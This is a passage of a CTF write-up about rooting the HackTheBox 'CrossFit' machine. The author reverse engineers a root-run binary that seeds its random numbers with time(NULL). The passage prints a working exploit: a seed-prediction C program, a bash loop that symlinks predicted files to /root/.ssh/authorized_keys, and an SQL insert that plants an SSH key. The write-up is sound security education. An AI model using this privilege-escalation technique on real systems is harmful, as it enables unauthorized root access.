+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+No mail.
+Last login: Tue May 12 02:53:34 2020 from 10.10.10.2
+isaac@crossfit:~$ id
+uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admins)
+isaac@crossfit:~$
+</code></pre>
+<p>
+ <em>
+  Nooooooice
+ </em>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Root: Reverse Engineering and Random Number Exploitation
+</h2>
+<p>
+ After getting access to
+ <code>
+  isaac
+ </code>
+ , I am going to be honest and admit I got a quite stuck. I was not completely sure what to do next for some time, until I uploaded
+ <a href="https://github.com/DominicBreuker/pspy">
+  pspy
+ </a>
+ to the box and looked at file system events with
+ <code>
+  pspy -f
+ </code>
+ . The most interesting events that I saw were coming from
+ <code>
+  /usr/bin/dbmsg
+ </code>
+ , which is significant to me due to the name, the references to databases and messaging on the machine and because it is a non-standard binary on Linux machines. I tried to run
+ <code>
+  /usr/bin/dbmsg
+ </code>
+ and get a peculiar message indeed...
+</p>
+<pre class="codehilite"><code>isaac@crossfit:~$ /usr/bin/dbmsg
+This program must be run as root.
+</code></pre>
+<p>
+ <em>
+  Hhhhhhhhhhhhhhmmmmmmmmmmmmmmmmmm
+ </em>
+</p>
+<p>
+ Since I could see the system file events associated with
+ <code>
+  /usr/bin/dbmsg
+ </code>
+ being executed, I knew that the
+ <code>
+  root
+ </code>
+ user had been configured to periodically run this binary since no other user could execute it.
+</p>
+<p>
+ However, I shed some tears when I realised that I had to reverse engineer (RE) the binary, which is not one of my strongest skills. Alas, I do want to learn more about RE, so I downloaded the binary to my machine and fired up
+ <a href="https://ghidra-sre.org/">
+  Ghidra
+ </a>
+ to have a closer look at it.
+</p>
+<p>
+ The first thing that piqued my interest was the
+ <code>
+  main
+ </code>
+ function and how the psuedo-random number generator seed was set.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/ghidramain.png"/>
+</p>
+<p>
+ It may by hard to discern how the seed is set from the above snippet, but the above code is effectively
+ <code>
+  srand(time(NULL))
+ </code>
+ in C, which sets the seed of the pseudo-random number generator to the time of execution of the
+ <code>
+  time(NULL)
+ </code>
+ call. This is not a secure method of seed generation, especially since I had access to machine and could continually brute force the seed by executing the two programs at a similar time.
+</p>
+<p>
+ Following along the code execution, we can see that a function called
+ <code>
+  process_data
+ </code>
+ is executed once the seed has been set. Let's take a closer look at that.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/ghidraprocess.png"/>
+</p>
+<p>
+ When I first saw this function I just broke down crying because I was scared by all of the assembly and decompiled C code. However, after a glass of whiskey and a second look at it I quickly realised that it was not that confusing and I could easily reverse engineer it.
+</p>
+<p>
+ Firstly, I noticed that the
+ <code>
+  messages
+ </code>
+ table on the MySQL server that I saw earlier is queried and each row is iterated through using the
+ <a href="https://dev.mysql.com/doc/c-api/5.7/en/c-api-introduction.html">
+  MySQL C API
+ </a>
+ . The most interesting function that was used from this API was
+ <code>
+  mysql_fetch_row
+ </code>
+ , that returns a "MySQL Row Structure" according to the
+ <a href="https://dev.mysql.com/doc/c-api/5.7/en/mysql-fetch-row.html">
+  documentation
+ </a>
+ . This wording initially confused me, but I just realised it was just a convoluted way of saying that it returns an array of pointers to the data stored in each column of the row.
+</p>
+<p>
+ Now I might of triggered some of you by the mention of pointers.
+ <em>
+  Never fear, Ghostccamm is here to
+  <s>
+   try
+  </s>
+  explain how it works.
+ </em>
+ Let's say the messages table has the following row.
+</p>
+<pre class="codehilite"><code>+----+---------+-----------------------+-----------+
+| id | name    | email                 | message   |
++----+---------+-----------------------+-----------+
+|  1 | someone | someone@somewhere.com | something |
++----+---------+-----------------------+-----------+
+</code></pre>
+<p>
+ When
+ <code>
+  mysql_fetch_row
+ </code>
+ is called, it will return an array where the first element will 'point' to the string of the id, which is "1" in the above example. The next element in the array would be the name "someone" and so on for the other columns.
+</p>
+<p>
+ Now for a very brief refresher in pointers, the dereferencing operator
+ <code>
+  *
+ </code>
+ means to look at the data stored at that address instead of the address itself. Lets say we have an array called
+ <code>
+  somearray
+ </code>
+ , we can express the data in the first element using either
+ <code>
+  somearray[0]
+ </code>
+ or
+ <code>
+  *somearray
+ </code>
+ . They both mean the same thing since both expressions are looking at the data stored at the start of the array. This means that the snippet,
+ <code>
+  lVar3 = *local_38
+ </code>
+ , is just setting the variable
+ <code>
+  lVar3
+ </code>
+ to the id of the row.
+</p>
+<p>
+ Now lets put all of these jigsaw pieces together. One of my goals was to figure out the location where the contents from the query is saved to, which is shown in the following decompiled code snippet.
+</p>
+<pre class="codehilite"><code class="language-c">lVar3 = *local_38;
+uVar2 = rand();
+snprintf(local_c8,0x30,"%d%s",(ulong)uVar2,lVar3);
+sVar5 = strlen(local_c8);
+md5sum(local_c8,sVar5 &amp; 0xffffffff,local_f8,sVar5 &amp; 0xffffffff);
+snprintf(local_98,0x30,"%s%s","/var/local/",local_f8);
+local_40 = fopen(local_98,"w");
+</code></pre>
+<p>
+ Seems confuddling? We actually already have everything we need to know to determine where the file is saved.
+ <code>
+  lVar3
+ </code>
+ is the id of the queried row and
+ <code>
+  uVar2
+ </code>
+ can be determined by executing a separate program that sets random seeds using
+ <code>
+  srand(time(NULL))
+ </code>
+ to 'guess' the seed that was used by
+ <code>
+  dbmsg
+ </code>
+ . Once these two variables are known, the filename is just the MD5 hash of the concatenation of
+ <code>
+  uVar2
+ </code>
+ and
+ <code>
+  lVar3
+ </code>
+ in
+ <code>
+  /var/local
+ </code>
+ .
+</p>
+<p>
+ However, would I have enough time to do any naughty stuff like creating a symbolic link to
+ <code>
+  /root/.ssh/authorized_keys
+ </code>
+ ? Yes I will! The seed is set at the start of the program then queries the MySQL, which although is running
+ <code>
+  localhost
+ </code>
+ gave me enough time to exploit the race condition and create our symbolic link to
+ <code>
+  /root/.ssh/authorized_keys
+ </code>
+ .
+</p>
+<p>
+ Now I just had to exploit this program! I first created a program using C to generate the string that is then hashed using MD5 (done using bash later), which I chucked down below. The reason why I chucked the number
+ <code>
+  1
+ </code>
+ after the randomly generated number is because this will be the id of the row that I will insert my payload into on the MySQL table.
+</p>
+<pre class="codehilite"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+
+int main() {
+    srand(time(0));
+    printf("%d1", rand());
+}
+</code></pre>
+<p>
+ I then compiled and uploaded the binary to the machine and executed the following bash to create the symbolic links to
+ <code>
+  /root/.ssh/authorized_keys
+ </code>
+ .
+</p>
+<pre class="codehilite"><code class="language-bash">while :; do ln -s /root/.ssh/authorized_keys "/var/local/$(./exploit | md5sum | cut -c -32)" 2&gt;/dev/null; done
+</code></pre>
+<p>
+ Finally we just need to insert our public SSH key into the table
+ <code>
+  messages
+ </code>
+ with the id of 1. I did this using the follow SQL query.
+</p>
+<pre class="codehilite"><code class="language-sql">insert into messages values (1, "", "", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvS6g5B96A8D2JL25Pwe0fZc+LmeecPn71xo2ozSxk5maKZSL/2TQ4Rvm0HbmTKeGElB/mAPw1hTq8FUsvcK++MiMwdEijWGPwXvFMgFGA/YIsKAD/5cvG0ZpkZYi20VvOb6MnafpuCjqgjGFs1a1yYfafVOXadAYkWDvB9gAegeHpW0gAyose/5Z4/K7QuqujfKji6jklQBiPyr+BF+KPSo8cwfaTvkd7j0k1qbeHxS383IUnyF3qi0hxWO4ZZi7iky4pLDY+td++7uc42en6x30kLD2GtC2Px9T7PB3PhfDOJlWS71nuBUy2wqqQp7pwf5Q0ZdNvMajJvkU+9l3y/+02ynRpLG+5ukaZkcyGorwCckWW3AZEzSbHyW9mhSU57lH4NGR7zs0AfQEuQhwFcG+PqGSk2t1dACj1SIt4FoeDm7+qqoDCoSUzY7M4CpYpJLE534gsmh3uyzDY2TR5wNNOxA1CaqZnEnHNv9YS9Vm2eJWpTyukI1eIMvAVlk0= ghost@yourshell");
+</code></pre>
+<p>
+ How I checked to see if my exploit was working correctly was by creating the symbolic link to a file that I could view. When I saw my payload pop into that file I went...
+</p>
+<p>
+ <strong>
+  YEEEEEEEEEAAAAAAAAA BOOOI!
+ </strong>
+</p>
+<p>
+ It worked and all I had to do was get root!
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/roooooooooooootttttbaaabyyy.png"/>
+</p>
+<p>
+ <strong>
+  YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYEEEEEEEEEEEEEEEEEEEEEEEEEEAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBOOOOOOOOOOOOOOIIIIIIIIIIIIII!!!!
+ </strong>
+</p>
+<p>
+ <em>
+  It was at this point I passed out due to exhaustion and slept for 1 week straight.
+ </em>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Conclusion
+</h2>
+<p>
+ This machine was
+ <em>
+  extremely
+ </em>
+ hard
+ <s>
+  (insert some sexual innuendo here)
+ </s>
+ , but one of the most rewarding experiences I have had on HackTheBox so far!
+</p>
+<p>
+ I really enjoyed the XSS scripting for initial and had a tonne of fun writing my little Python script to handle all of the HTTP requests and payload generation. From an aesthetic point of view, I love it when I am exploiting something to have multiple windows up using multiple services to trigger my exploits, makes me feel like a mad hacker. It was also a great opportunity to learn more about XSS and RE that I was
+ <em>
+  alright
+ </em>
+ at before, but my skills in those disciplines have significantly improved completing this box.
+</p>
+<p>
+ Now I am going back to bed to continue my recovery after completing this box. I will see you all the next time!
+</p></div>
+</div>
+</section>
+</section>
+
+    	</div>
+
+    <!-- Footer -->
+      <!-- Footer -->
+  <section id="footer">
+    <div class="inner">
+      <ul class="icons">
+        <li><a href="https://twitter.com/GhostCcamm" class="icon brands fa-twitter"><span class="label"></span></a></li>
+        <li><a href="https://github.com/Ccamm" class="icon brands fa-github"><span class="label"></span></a></li>
+      </ul>
+    </div>
+  </section>
+
+		<!-- Particles -->
+			<div id="particles-js"></div>
+
+		<!-- Scripts -->
+			<script src="/assets/js/jquery.min.js"></script>
+			<script src="/assets/js/jquery.scrollex.min.js"></script>
+			<script src="/assets/js/browser.min.js"></script>
+			<script src="/assets/js/breakpoints.min.js"></script>
+			<script src="/assets/js/util.js"></script>
+			<script src="/assets/js/particles.min.js"></script>
+			<script src="/assets/js/main.js"></script>
+      
+	</body>
+</html>
